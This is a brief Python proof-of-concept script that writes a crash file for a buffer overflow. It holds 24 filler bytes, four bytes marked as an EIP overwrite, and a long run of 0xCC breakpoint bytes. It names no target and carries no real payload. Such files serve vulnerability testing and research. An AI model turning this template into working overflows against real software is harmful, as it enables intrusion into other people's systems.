#!/usr/bin/python
file="poc.txt"

junk1="\x41" * 24
eip="\x42" * 4
junk2="\xCC" * 50000

poc=junk1 + eip + junk2

try:
    print ("[*] Creating exploit file...\n");
    writeFile = open (file, "w")
    writeFile.write( poc )
    writeFile.close()
    print ("[*] File successfully created!");
except:
    print ("[!] Error while creating file!");
